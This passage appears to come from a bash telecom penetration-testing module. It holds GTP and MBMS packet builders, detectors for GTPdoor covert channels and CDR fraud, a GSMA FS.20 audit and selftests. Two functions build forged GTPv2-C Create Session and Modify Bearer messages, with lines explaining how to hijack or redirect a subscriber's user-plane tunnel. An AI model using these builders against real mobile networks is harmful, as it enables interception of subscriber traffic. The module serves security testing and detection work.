    printf 'lmri=%d msri=%d spare=0x%02X' "$(( (b >> 1) & 1 ))" "$(( b & 1 ))" "$(( b & 0xFC ))"
}

lcore_cmd_gtp_in_gtp() {
    local outer="11223344" inner="55667788" payload="DEADBEEF0102"
    local seq="" oseq="" with_ip=0 out=""
    local src="192.168.1.1" dst="172.16.0.1"
    while (( $# > 0 )); do
        case "$1" in
            --with-ip) with_ip=1; shift ;;
            --outer-teid|--inner-teid|--payload|--seq|--outer-seq|--src|--dst|--out)
                (( $# >= 2 )) || {
                    printf 'ERROR\t%s needs a value\n' "$(lcore_sanitize "$1")" >&2; return 2; }
                case "$1" in
                    --outer-teid) outer="$2" ;;
                    --inner-teid) inner="$2" ;;
                    --payload)    payload="$2" ;;
                    --seq)        seq="$2" ;;
                    --outer-seq)  oseq="$2" ;;
                    --src)        src="$2" ;;
                    --dst)        dst="$2" ;;
                    --out)        out="$2" ;;
                esac
                shift 2 ;;
            *)
                printf 'ERROR\tunknown argument: %s\n' "$(lcore_sanitize "$1")" >&2
                printf 'WHY\tusage: --gtp-in-gtp [--outer-teid hex] [--inner-teid hex] [--payload hex] [--seq hex] [--outer-seq hex] [--with-ip --src a.b.c.d --dst a.b.c.d] [--out path]\n' >&2
                return 2 ;;
        esac
    done

    local inner_pkt encap csum="" ip_total=""
    inner_pkt=$(lcore_gtpu_gtpdu "$inner" "$payload" "$seq") || return $?
    encap="$inner_pkt"
    if (( with_ip )); then
        local inner_oct=$(( ${#inner_pkt} / 2 ))
        local udp; printf -v udp '%04X%04X%04X0000' 2152 2152 "$(( 8 + inner_oct ))"
        local ipp; ipp=$(lcore_ipv4_build "$src" "$dst" "${udp}${inner_pkt}" 17) || return $?
        csum="${ipp:20:4}"
        ip_total=$(( ${#ipp} / 2 ))
        encap="$ipp"
    fi
    local outer_pkt; outer_pkt=$(lcore_gtpu_gtpdu "$outer" "$encap" "$oseq") || return $?

    # Prove the build by reading it back with this module's own GTP-U reader.
    local rb; rb=$(lcore_gtpu_parse_header "$outer_pkt") || {
        printf 'ERROR\tthe builder produced octets its own GTP-U reader rejects\n' >&2; return 1; }
    local off=0
    if (( with_ip )); then off=$(( (20 + 8) * 2 )); fi
    local rb2; rb2=$(lcore_gtpu_parse_header "${encap:$off}") || rb2=""

    printf 'gtp_in_gtp\t1\n'
    printf 'outer_layer\tGTPv1-U G-PDU (TS 29.281 §5.1)\n'
    printf 'inner_layer\tGTPv1-U G-PDU\n'
    printf 'outer_teid\t0x%s\n' "$(printf '%08X' "$(( 16#$outer ))")"
    printf 'inner_teid\t0x%s\n' "$(printf '%08X' "$(( 16#$inner ))")"
    printf 'ip_layer\tnone\n'
    if (( with_ip )); then
        printf 'ip_layer_note\tthis is GTP, not IP: no IPv4/UDP wraps the outer GTP-U header, so the value is an encapsulation of octets and not a routable datagram. The IPv4/UDP 2152 packet --with-ip asks for sits *inside* the outer G-PDU, around the inner G-PDU\n'
    else
        printf 'ip_layer_note\tthis is GTP, not IP: the outer layer is the 8-octet GTP-U header with no IPv4/UDP around it, so the value is an encapsulation of octets and not a routable datagram\n'
    fi
    printf 'payload\t%s\n' "$(lcore_nfc "$payload")"
    printf 'seq_inner\t%s\n' "${seq:-none}"
    printf 'seq_outer\t%s\n' "${oseq:-none}"
    if (( with_ip )); then
        printf 'inner_ipv4\t%s->%s\n' "$src" "$dst"
        printf 'inner_ipv4_bytes\t%s\n' "$ip_total"
        printf 'inner_udp\t2152->2152\n'
        printf 'inner_ipv4_checksum\t0x%s\n' "$csum"
    fi
    printf 'bytes\t%s\n' "$(( ${#outer_pkt} / 2 ))"
    printf 'hex\t%s\n' "$outer_pkt"
    printf 'readback.outer_teid\t0x%s\n' "$(printf '%s\n' "$rb" | awk -F'\t' '$1=="teid_hex"{print $2}')"
    printf 'readback.outer_length_agrees\t%s\n' "$(printf '%s\n' "$rb" | awk -F'\t' '$1=="length_agrees"{print $2}')"
    if [[ -n "$rb2" ]]; then
        printf 'readback.inner_teid\t0x%s\n' "$(printf '%s\n' "$rb2" | awk -F'\t' '$1=="teid_hex"{print $2}')"
        printf 'readback.inner_payload\t%s\n' "$(printf '%s\n' "$rb2" | awk -F'\t' '$1=="payload"{print $2}')"
    fi
    printf 'sent\t0\n'
    printf 'ref\tTS 29.281 §5.1: a G-PDU is Flags, Type 0xFF, Length and TEID followed by an uninterpreted T-PDU\n'
    printf 'ref\tTS 29.281 §4.2: the E/S/PN bits and the 4-octet trailer (sequence number, N-PDU number, next extension header type) they introduce\n'
    printf 'ref\tTS 29.281 §5.1: Length counts the octets after the 8-octet mandatory header, trailer included\n'
    printf 'ref\tTS 29.274 §5.1: not used for the outer layer — a GTPv2-C header has no uninterpreted payload octets, so an inner message there would need an IE\n'
    printf 'ref\tRFC 791 §3.1: the IPv4 header and its one'"'"'s-complement checksum, used only when --with-ip asks for it\n'
    printf 'limit\tthe outer layer is GTPv1-U because TS 29.281 §5.1 gives the G-PDU an octet payload a data-plane forwarder never interprets; a GTPv2-C outer would have to carry the inner message in a typed IE and is a different artefact\n'
    printf 'limit\tno outer IP/UDP is built by default, so this is the encapsulated G-PDU and not a wire frame; --with-ip adds inner-tunnel IPv4/UDP 2152 framing\n'
    printf 'limit\ttshark 4.2.2 does not recurse into a G-PDU payload, so the default form reads as one gtp layer with T-PDU Data; the two-layer reading is only visible with --with-ip\n'
    printf 'capability\tartefact: encapsulated octets; effect: none; handoff: --gtpc-send for a GTPv2-C leg or --plan gtp-inject for a testbed\n'
    if [[ -n "$out" ]]; then
        command -v xxd >/dev/null 2>&1 || {
            printf 'ERROR\t--out needs xxd, which is not on PATH\n' >&2; return 1; }
        mkdir -p "$(dirname "$out")" 2>/dev/null
        printf '%s' "$outer_pkt" | xxd -r -p > "$out" 2>/dev/null || {
            printf 'ERROR\tcould not write %s\n' "$(lcore_sanitize "$out")" >&2; return 1; }
        printf 'out_file\t%s\n' "$(lcore_sanitize "$out")"
    fi
    return 0
}

lcore_cmd_mbms_session() {
    local teid="0" seq="1"
    local mcc="310" mnc="260" service_id="010203"
    local duration="3600" days="0" area_ids="1,2"
    local mcd_cteid="00000001" mcd_dist="239.1.1.1" mcd_src="10.0.0.5" hc="0"
    local session_id="01" flow_id="0001" mbms_flags="00"
    local fteid_teid="0000000A" fteid_iface="10" fteid_ip="10.0.0.10"
    local qci="9" mbr_ul="10000" mbr_dl="10000" gbr_ul="0" gbr_dl="0"
    local mood=0 out=""
    while (( $# > 0 )); do
        case "$1" in
            --mood) mood=1; shift ;;
            --imsi|--m-tmsi)
                printf 'ERROR\t%s is not built: TS 29.274 Table 7.13.1-1 does not list an IMSI among the IEs of MBMS Session Start Request\n' "$(lcore_sanitize "$1")" >&2
                printf 'WHY\tthe mandatory set the clause fixes is 80, 87, 138, 139, 142, 158; placing an IMSI would invent a position the clause does not fix\n' >&2
                return 2 ;;
            --counting)
                printf 'ERROR\t--counting is not built: TS 29.274 defines no MBMS Counting IE\n' >&2
                printf 'WHY\tno IE type in Table 8.1-1 carries a counting request for this message, and neither the clause table nor the tshark IE registry names one\n' >&2
                return 2 ;;
            --distribution-indication)
                printf 'ERROR\t--distribution-indication is not built: IE 143 MBMS Distribution Acknowledge belongs to the MBMS Session Start response\n' >&2
                printf 'WHY\tTS 29.274 Table 7.13.2-1 lists IE 143 on the response; the request table (7.13.1-1) does not, so there is nothing to place in this message\n' >&2
                return 2 ;;
            --teid|--seq|--mcc|--mnc|--service-id|--duration|--days|--area-ids|--mcd-cteid|--mcd-dist|--mcd-src|--hc|--session-id|--flow-id|--flags|--fteid-teid|--fteid-iface|--fteid-ip|--qci|--mbr-ul|--mbr-dl|--gbr-ul|--gbr-dl|--out)
                (( $# >= 2 )) || {
                    printf 'ERROR\t%s needs a value\n' "$(lcore_sanitize "$1")" >&2; return 2; }
                case "$1" in
                    --teid) teid="$2" ;;
                    --seq) seq="$2" ;;
                    --mcc) mcc="$2" ;;
                    --mnc) mnc="$2" ;;
                    --service-id) service_id="$2" ;;
                    --duration) duration="$2" ;;
                    --days) days="$2" ;;
                    --area-ids) area_ids="$2" ;;
                    --mcd-cteid) mcd_cteid="$2" ;;
                    --mcd-dist) mcd_dist="$2" ;;
                    --mcd-src) mcd_src="$2" ;;
                    --hc) hc="$2" ;;
                    --session-id) session_id="$2" ;;
                    --flow-id) flow_id="$2" ;;
                    --flags) mbms_flags="$2" ;;
                    --fteid-teid) fteid_teid="$2" ;;
                    --fteid-iface) fteid_iface="$2" ;;
                    --fteid-ip) fteid_ip="$2" ;;
                    --qci) qci="$2" ;;
                    --mbr-ul) mbr_ul="$2" ;;
                    --mbr-dl) mbr_dl="$2" ;;
                    --gbr-ul) gbr_ul="$2" ;;
                    --gbr-dl) gbr_dl="$2" ;;
                    --out) out="$2" ;;
                esac
                shift 2 ;;
            *)
                printf 'ERROR\tunknown argument: %s\n' "$(lcore_sanitize "$1")" >&2
                printf 'WHY\tusage: --mbms-session [--teid hex] [--seq hex] [--mcc 3d --mnc 2or3d] [--service-id hex6] [--duration seconds --days n] [--area-ids a,b] [--mcd-cteid hex] [--mcd-dist a.b.c.d --mcd-src a.b.c.d] [--hc 0or1] [--session-id hex2] [--flow-id hex4] [--flags hex2] [--fteid-teid hex --fteid-iface n --fteid-ip a.b.c.d] [--qci n --mbr-ul n --mbr-dl n --gbr-ul n --gbr-dl n] [--mood] [--out path]\n' >&2
                return 2 ;;
        esac
    done

    [[ "$teid" =~ ^[0-9A-Fa-f]{1,8}$ ]] || {
        printf 'ERROR\tTEID must be 1..8 hex digits, got %s\n' "$(lcore_sanitize "$teid")" >&2; return 2; }
    [[ "$seq" =~ ^[0-9A-Fa-f]{1,6}$ ]] || {
        printf 'ERROR\tsequence number must be 1..6 hex digits, got %s\n' "$(lcore_sanitize "$seq")" >&2; return 2; }
    [[ "$mcc" =~ ^[0-9]{3}$ && "$mnc" =~ ^[0-9]{2,3}$ ]] || {
        printf 'ERROR\tMCC is 3 digits and MNC 2 or 3 digits\n' >&2; return 2; }
    [[ "$service_id" =~ ^[0-9A-Fa-f]{6}$ ]] || {
        printf 'ERROR\tMBMS Service ID is 3 octets of hex, got %s\n' "$(lcore_sanitize "$service_id")" >&2; return 2; }
    [[ "$duration" =~ ^[0-9]+$ && "$days" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--duration and --days take decimal numbers\n' >&2; return 2; }
    (( 10#$duration <= 86400 )) || {
        printf 'ERROR\tMBMS Session Duration of %s seconds exceeds the 86400 the clause allows (TS 29.274 §8.69 via TS 29.061 §17.7.7)\n' "$(lcore_sanitize "$duration")" >&2; return 2; }
    (( 10#$days <= 18 )) || {
        printf 'ERROR\tMBMS Session Duration of %s days exceeds the 18 the clause allows (TS 29.274 §8.69 via TS 29.061 §17.7.7)\n' "$(lcore_sanitize "$days")" >&2; return 2; }
    [[ "$session_id" =~ ^[0-9A-Fa-f]{2}$ ]] || {
        printf 'ERROR\tMBMS Session Identifier is 1 octet of hex, got %s\n' "$(lcore_sanitize "$session_id")" >&2; return 2; }
    [[ "$flow_id" =~ ^[0-9A-Fa-f]{4}$ ]] || {
        printf 'ERROR\tMBMS Flow Identifier is 2 octets of hex, got %s\n' "$(lcore_sanitize "$flow_id")" >&2; return 2; }
    [[ "$mbms_flags" =~ ^[0-9A-Fa-f]{2}$ ]] || {
        printf 'ERROR\t--flags is 1 octet of hex, got %s\n' "$(lcore_sanitize "$mbms_flags")" >&2; return 2; }
    [[ "$fteid_teid" =~ ^[0-9A-Fa-f]{1,8}$ ]] || {
        printf 'ERROR\tF-TEID TEID must be 1..8 hex digits, got %s\n' "$(lcore_sanitize "$fteid_teid")" >&2; return 2; }
    [[ "$fteid_iface" =~ ^[0-9]+$ ]] && (( 10#$fteid_iface <= 63 )) || {
        printf 'ERROR\tF-TEID interface type is 0..63, got %s\n' "$(lcore_sanitize "$fteid_iface")" >&2; return 2; }
    [[ "$mcd_cteid" =~ ^[0-9A-Fa-f]{1,8}$ ]] || {
        printf 'ERROR\tCommon TEID must be 1..8 hex digits, got %s\n' "$(lcore_sanitize "$mcd_cteid")" >&2; return 2; }
    [[ "$hc" =~ ^[01]$ ]] || {
        printf 'ERROR\t--hc is 0 (uncompressed header) or 1 (compressed header), got %s\n' "$(lcore_sanitize "$hc")" >&2; return 2; }
    local n
    for n in "$qci" "$mbr_ul" "$mbr_dl" "$gbr_ul" "$gbr_dl"; do
        [[ "$n" =~ ^[0-9]+$ ]] || {
            printf 'ERROR\tQCI and the QoS rates take decimal numbers\n' >&2; return 2; }
    done
    (( 10#$qci <= 255 )) || {
        printf 'ERROR\tQCI is one octet (0..255), got %s\n' "$(lcore_sanitize "$qci")" >&2; return 2; }
    for n in "$mbr_ul" "$mbr_dl" "$gbr_ul" "$gbr_dl"; do
        # Five octets per rate (§8.15): anything wider would push the IE out.
        (( 10#$n <= 1099511627775 )) || {
            printf 'ERROR\ta QoS rate is five octets (max 1099511627775), got %s\n' "$(lcore_sanitize "$n")" >&2; return 2; }
    done

    local qos_val; printf -v qos_val '00%02X%010X%010X%010X%010X' \
        "$(( 10#$qci ))" "$(( 10#$mbr_ul ))" "$(( 10#$mbr_dl ))" \
        "$(( 10#$gbr_ul ))" "$(( 10#$gbr_dl ))"
    local fteid_ip_hex; fteid_ip_hex=$(lcore_ipv4_hex "$fteid_ip") || {
        printf 'ERROR\t--fteid-ip is not a dotted quad: %s\n' "$(lcore_sanitize "$fteid_ip")" >&2; return 2; }
    local fteid_val; printf -v fteid_val '%02X%08X%s' \
        "$(( 0x80 | 10#$fteid_iface ))" "$(( 16#$fteid_teid ))" "$fteid_ip_hex"
    local dur_val; printf -v dur_val '%06X' "$(( (10#$duration << 7) | 10#$days ))"

    local codes=() code old_ifs="$IFS"
    IFS=','
    for code in $area_ids; do codes+=("$code"); done
    IFS="$old_ifs"
    local cnt=${#codes[@]}
    (( cnt >= 1 && cnt <= 256 )) || {
        printf 'ERROR\tthe service area carries 1..256 codes, got %d\n' "$cnt" >&2; return 2; }
    local sa_val; printf -v sa_val '%02X' "$(( cnt - 1 ))"
    for code in "${codes[@]}"; do
        [[ "$code" =~ ^[0-9]{1,5}$ ]] && (( 10#$code <= 65535 )) || {
            printf 'ERROR\tservice area code is not a 0..65535 number: %s\n' "$(lcore_sanitize "$code")" >&2; return 2; }
        printf -v sa_val '%s%04X' "$sa_val" "$(( 10#$code ))"
    done
    local dist_hex src_hex
    dist_hex=$(lcore_ipv4_hex "$mcd_dist") || {
        printf 'ERROR\t--mcd-dist is not a dotted quad: %s\n' "$(lcore_sanitize "$mcd_dist")" >&2; return 2; }
    src_hex=$(lcore_ipv4_hex "$mcd_src") || {
        printf 'ERROR\t--mcd-src is not a dotted quad: %s\n' "$(lcore_sanitize "$mcd_src")" >&2; return 2; }
    local mcd_val; printf -v mcd_val '%08X04%s04%s%02X' \
        "$(( 16#$mcd_cteid ))" "$dist_hex" "$src_hex" "$(( hc & 0xFF ))"
    local plmn_hex; plmn_hex=$(lcore_plmn_bcd "$mcc" "$mnc") || return 2
    local tmgi_val="${service_id}${plmn_hex}"

    # Presence comes from TS 29.274 Table 7.13.1-1; the order below is the
    # mandatory set first and then the optional ones this verb fills. The
    # clause does not fix an order (see the limit row): each IE carries its
    # own Type and Instance, so a reader keys on those.
    local body="" ie
    ie=$(lcore_gtpc_ie_raw 80 "$qos_val") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 87 "$fteid_val") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 138 "$dur_val") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 139 "$sa_val") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 142 "$mcd_val") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 158 "$tmgi_val") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 140 "$session_id") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 141 "$flow_id") || return 2; body+="$ie"
    ie=$(lcore_gtpc_ie_raw 171 "$mbms_flags") || return 2; body+="$ie"

    local msg; msg=$(lcore_gtpc_msg 231 "$teid" "$seq" "$body") || return 1
    local body_hex="${msg:24}"

    # Prove the build by walking it back with this module's own IE reader, in
    # the exact (unpadded) mode the builder wrote.
    local walk; walk=$(lcore_gtpc_parse_ies "$body_hex" exact) || {
        printf 'ERROR\tthe builder wrote IEs its own reader cannot walk\n' >&2; return 1; }

    printf 'mbms_session\t1\n'
    if (( mood )); then printf 'variant\tmood\n'; else printf 'variant\trequest\n'; fi
    printf 'gtp_version\t2\n'
    printf 'message_type\t231\n'
    printf 'message_name\tMBMS Session Start Request\n'
    printf 'teid\t0x%s\n' "$(printf '%08X' "$(( 16#$teid ))")"
    printf 'seq\t0x%s\n' "$(printf '%06X' "$(( 16#$seq ))")"
    printf 'teid_flag\tset (GTP-C flags 0x48)\n'
    printf 'ie_count\t%s\n' "$(printf '%s\n' "$walk" | awk -F'\t' '$1=="ie_count"{print $2}')"
    printf '%s\n' "$walk" | grep -v '^ie_count'
    printf 'body\t%s\n' "$body_hex"
    printf 'bytes\t%s\n' "$(( ${#msg} / 2 ))"
    printf 'hex\t%s\n' "$msg"
    printf 'sent\t0\n'
    printf 'ref\tTS 29.274 §7.13.1 and Table 7.13.1-1: MBMS Session Start Request, message type 231\n'
    printf 'ref\tTS 29.274 §8.15: Bearer QoS — flags, QCI, then MBR uplink/downlink and GBR uplink/downlink, five octets each\n'
    printf 'ref\tTS 29.274 §8.22: F-TEID — the Sender F-TEID for Control Plane, IPv4 form\n'
    printf 'ref\tTS 29.274 §8.69: MBMS Session Duration, three octets, seconds then days (TS 29.061 §17.7.7)\n'
    printf 'ref\tTS 29.274 §8.70: MBMS Service Area, first octet is the number of codes minus one (TS 29.061 §17.7.6)\n'
    printf 'ref\tTS 29.274 §8.73: MBMS IP Multicast Distribution — Common TEID, distribution address, source address, HC indicator\n'
    printf 'ref\tTS 29.274 §8.89: TMGI — MBMS Service ID (3 octets) then MCC/MNC (3 octets)\n'
    printf 'ref\tTS 29.274 §5.6.1: Message Length does not count the first four octets of the header\n'
    printf 'limit\tTable 7.13.1-1 fixes which IEs are present, not the order they appear in: each IE carries its own Type and Instance, so TS 29.274 §8.1 leaves the order to the sender. This build writes the mandatory set first (80, 87, 138, 139, 142, 158) and the optional ones after (140, 141, 171); it does not claim that order is mandated\n'
    printf 'limit\tno IMSI and no M-TMSI: neither the mandatory nor the optional set of Table 7.13.1-1 carries one, so --imsi and --m-tmsi are refused rather than placed somewhere the clause does not fix\n'
    printf 'limit\tno MBMS Counting IE: TS 29.274 defines no such IE, so --counting is refused\n'
    printf 'limit\tthe MBMS Distribution Indication in the brief is IE 143 MBMS Distribution Acknowledge, which Table 7.13.2-1 puts on the response and not on this request, so --distribution-indication is refused\n'
    printf 'limit\tthe IEs are not padded to a 4-octet boundary, because tshark reads a GTPv2-C IE stream as 4+Length and calls a padded stream Malformed Packet; the older GTP-C builders in this module pad, so both conventions exist and this divergence is deliberate\n'
    printf 'limit\tthis is a message, not a transmission: sent is 0, and --gtpc-send on UDP 2123 is a separate decision\n'
    printf 'capability\tartefact: MBMS Session Start Request octets; effect: none; handoff: --gtpc-send or a --plan naming a testbed\n'
    if (( mood )); then
        printf 'mood_marker\t1\n'
        printf 'mood_note\tMBMS over Demand is not an IE and not another message: it is this same MBMS Session Start Request, originated by the network after the UE asked for the service over a unicast bearer\n'
        printf 'limit\tMooD: what can be stated from the clause is the message type (231), the mandatory IE set and the fact that the TMGI names the service; TS 29.274 Table 7.13.1-1 has no MooD-specific field, so the octets are identical to the non-MooD build and this row is the only marker — a receiver cannot tell this message was MooD-originated\n'
    fi
    if [[ -n "$out" ]]; then
        command -v xxd >/dev/null 2>&1 || {
            printf 'ERROR\t--out needs xxd, which is not on PATH\n' >&2; return 1; }
        mkdir -p "$(dirname "$out")" 2>/dev/null
        printf '%s' "$msg" | xxd -r -p > "$out" 2>/dev/null || {
            printf 'ERROR\tcould not write %s\n' "$(lcore_sanitize "$out")" >&2; return 1; }
        printf 'out_file\t%s\n' "$(lcore_sanitize "$out")"
    fi
    return 0
}

lcore_cmd_gtp_csr_forge() {
    local imsi="${1:-310150123456789}" apn="${2:-internet}" mcc="${3:-310}" mnc="${4:-260}"
    [[ "$imsi" =~ ^[0-9]{10,15}$ ]] || { printf 'ERROR\tIMSI must be 10..15 digits\n' >&2; return 2; }
    local imsi_ie apn_ie sn_ie msg
    imsi_ie=$(lcore_gtpc_ie 1 "$(lcore_bcd_encode "$imsi")") || return 2
    apn_ie=$(lcore_gtpc_ie 71 "$(lcore_apn_encode "$apn")") || return 2
    sn_ie=$(lcore_gtpc_ie 83 "$(lcore_plmn_bcd "$mcc" "$mnc")") || return 2
    msg=$(lcore_gtpc_msg 32 "" 1 "${imsi_ie}${apn_ie}$(lcore_gtpc_ie 82 06)${sn_ie}")
    printf 'message_type\t32\nmessage_name\t%s\nimsi\t%s\napn\t%s\nimsi_ie\t%s\nmessage\t%s\n' \
        "$(lcore_gtpc_msg_name 32)" "$imsi" "$apn" "$imsi_ie" "$msg"
    printf 'attack\tforged Create Session Request — the SGW allocates an EPS bearer for this IMSI; point the F-TEID it returns at your endpoint to take the user plane\n'
}
lcore_cmd_gtp_modify_bearer() {
    local teid="${1:-}" ebi="${2:-5}"
    [[ "$teid" =~ ^[0-9A-Fa-f]{1,8}$ ]] || { printf 'ERROR\tTEID is up to 8 hex digits\n' >&2; return 2; }
    [[ "$ebi" =~ ^[0-9]+$ ]] || { printf 'ERROR\tEBI must be numeric\n' >&2; return 2; }
    local bc msg
    bc=$(lcore_gtpc_ie 93 "$(lcore_gtpc_ie 73 "$(printf '%02X' "$(( ebi & 0xFF ))")")") || return 2
    msg=$(lcore_gtpc_msg 34 "$teid" 2 "$bc")
    printf 'message_type\t34\nmessage_name\t%s\nteid\t%s\nebi\t%s\nmessage\t%s\n' \
        "$(lcore_gtpc_msg_name 34)" "$teid" "$ebi" "$msg"
    printf 'attack\tforged Modify Bearer on a live session — updates the S1-U F-TEID for the bearer (the handover path legitimately does this), redirecting the subscriber tunnel\n'
}
# GTPdoor rides Echo Request/Response as a C2 channel. A clean Echo carries a
# single Recovery IE; extra IEs or a payload without Recovery is the tell.
lcore_cmd_gtpdoor() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 2; }
    local hdr type pl
    hdr=$(lcore_gtpc_parse_header "$hex") || return 1
    type=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="message_type"{print $2}')
    pl=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="payload"{print $2}')
    printf 'message_type\t%s\nmessage_name\t%s\n' "$type" "$(lcore_gtpc_msg_name "$type")"
    local n=0
    if (( type == 1 || type == 2 )); then
        if [[ -n "$pl" ]]; then
            local ies weird recy
            ies=$(lcore_gtpc_parse_ies "$pl" 2>/dev/null) || ies=""
            weird=$(printf '%s\n' "$ies" | awk -F'\t' '$1 ~ /\.type$/ && $2 != 3 {n++} END{print n+0}')
            (( weird > 0 )) && { printf 'finding\tHIGH\tEcho carries %s non-Recovery IE(s) — GTPdoor-class covert channel\n' "$weird"; n=$(( n + 1 )); }
            recy=$(printf '%s\n' "$ies" | awk -F'\t' '$1 ~ /\.name$/ && $2 ~ /Recovery/ {print "yes"; exit}')
            [[ "$recy" != yes ]] && { printf 'finding\tHIGH\tEcho has a payload but no Recovery IE — malformed Echo abuse\n'; n=$(( n + 1 )); }
        fi
        (( n == 0 )) && printf 'finding\tINFO\tshape consistent with a plain Echo\n'
    else
        printf 'finding\tINFO\tnot an Echo message; GTPdoor rides Echo Request/Response\n'
    fi
    printf 'findings\t%s\n' "$n"
}
# CDR anomaly: a subscriber whose per-session volume is implausible against
# their own baseline is the overbilling/bypass signature.
lcore_cmd_cdr_fraud() {
    local file="${1:-}"
    [[ -f "$file" ]] || { printf 'ERROR\tno such CDR file: %s\n' "$file" >&2; return 1; }
    printf 'imsi\tbytes_s\tavg_bytes\tfactor\tverdict\n'
    awk -F'\t' 'NR==1 && $1 ~ /^imsi/ { next }
        NF>=3 { imsi=$1; b=$2+0; a=$3+0; f=(a>0)?b/a:0;
                v=(f>10)?"OVERBILLING":(f>5)?"SUSPECT":"normal";
                printf "%s\t%d\t%d\t%.1f\t%s\n", imsi, b, a, f, v }' "$file"
}
# GSMA FS.20 — the GTP interconnect controls.
lcore_cmd_fs20() {
    local file="${1:-}"
    [[ -f "$file" ]] || { printf 'ERROR\tno such config: %s\n' "$file" >&2; return 1; }
    local imsi_plmn="" whitelist="" echo_anom="" cdr_anom="" teid_valid="" line k v
    while IFS= read -r line; do
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ "$line" == *=* ]] || continue
        k=$(printf '%s' "${line%%=*}" | tr -d ' ' | tr 'A-Z' 'a-z'); v="${line#*=}"
        case "$k" in
            imsi_plmn_consistency) imsi_plmn="$v" ;;
            peer_whitelist|ip_whitelist) whitelist="$v" ;;
            echo_anomaly|echo_anomaly_detection) echo_anom="$v" ;;
            cdr_anomaly|cdr_anomaly_detection) cdr_anom="$v" ;;
            teid_validation|sanity_checks) teid_valid="$v" ;;
        esac
    done < "$file"
    printf 'control\tpresent\tseverity_if_missing\tdetail\n'
    printf 'imsi_plmn_consistency\t%s\tHIGH\tIMSI must belong to the Serving Network PLMN (FS.20)\n' "$([[ "$imsi_plmn" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'peer_whitelist\t%s\tHIGH\tGTP-C peers restricted to whitelisted interconnect addresses\n' "$([[ "$whitelist" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'echo_anomaly\t%s\tMEDIUM\tEcho Request/Recovery anomaly detection (GTPdoor)\n' "$([[ "$echo_anom" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'cdr_anomaly\t%s\tMEDIUM\tCDR volume/duration anomaly detection\n' "$([[ "$cdr_anom" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'teid_validation\t%s\tMEDIUM\tTEID and IE sanity checks on inbound GTP-C\n' "$([[ "$teid_valid" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    local missing=0
    for v in "$imsi_plmn" "$whitelist" "$echo_anom" "$cdr_anom" "$teid_valid"; do
        [[ "$v" =~ ^(true|yes|1|on)$ ]] || missing=$(( missing + 1 ))
    done
    printf 'controls_missing\t%d\n' "$missing"
}

# ── selftest — no radio, no root, no network ────────────────────────────
lcore_selftest() {
    local bad=0 ok=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"; ok=$((ok + 1))
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad + 1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot"
    export CAPTURES_DIR="$d/captures"
    export STATE_DIR="$d/state"
    export LCORE_DIR="$d/loot/lte_core"
    export LCORE_PLANS="$LCORE_DIR/plans"

    # ── 1. Diameter header parse of a hand-built message ────────────────
    # Hand-built AIR-shaped header with no AVPs: version 1, length 20 (0x14),
    # flags 0xC0 (R|P), command 318 (0x00013E), app 16777251 (0x01000023),
    # hop-by-hop 1, end-to-end 1.
    local hdr="01000014C000013E010000230000000100000001"
    out=$(lcore_diameter_parse_header "$hdr"); rc=$?
    chk dh-rc        "$rc" "0"
    chk dh-version   "$(fld "$out" version)" "1"
    chk dh-length    "$(fld "$out" length)" "20"
    chk dh-flags     "$(fld "$out" flags)" "C0"
    chk dh-R         "$(fld "$out" flag_R)" "1"
    chk dh-P         "$(fld "$out" flag_P)" "1"
    chk dh-E         "$(fld "$out" flag_E)" "0"
    chk dh-T         "$(fld "$out" flag_T)" "0"
    chk dh-cmd       "$(fld "$out" command_code)" "318"
    chk dh-cmdname   "$(fld "$out" command_name)" "Authentication-Information (AIR/AIA)  [S6a/S6d]"
    chk dh-app       "$(fld "$out" application_id)" "16777251"
    chk dh-appname   "$(fld "$out" application_name)" "3GPP S6a/S6d"
    chk dh-hbh       "$(fld "$out" hop_by_hop_id)" "1"
    chk dh-e2e       "$(fld "$out" end_to_end_id)" "1"
    chk dh-lenmismatch "$(fld "$out" length_mismatch)" "no"
    chk dh-body-empty "$(fld "$out" body)" ""

    # Message Length is 24-bit and must be read big-endian: 0x000100 = 256.
    out=$(lcore_diameter_parse_header "01000100C000013E010000230000000100000001")
    chk dh-length-24 "$(fld "$out" length)" "256"
    chk dh-lenmismatch2 "$(fld "$out" length_mismatch | cut -d" " -f1)" "yes"

    # Flag decoding must be positional, not "any bit set".
    out=$(lcore_diameter_parse_header "010000148000013E010000230000000100000001")
    chk dh-flags-onlyR "$(fld "$out" flag_R)" "1"
    chk dh-flags-P0    "$(fld "$out" flag_P)" "0"
    out=$(lcore_diameter_parse_header "010000142000013E010000230000000100000001")
    chk dh-flags-onlyE "$(fld "$out" flag_E)" "1"
    chk dh-flags-R0    "$(fld "$out" flag_R)" "0"

    chk dh-short   "$(lcore_diameter_parse_header 01000014 >/dev/null 2>&1; echo $?)" "1"
    chk dh-nonhex  "$(lcore_diameter_parse_header zzzz >/dev/null 2>&1; echo $?)" "1"
    chk dh-missing "$(lcore_cmd_decode_diameter >/dev/null 2>&1; echo $?)" "2"

    # ── 2. AVP walk, including a grouped AVP ────────────────────────────
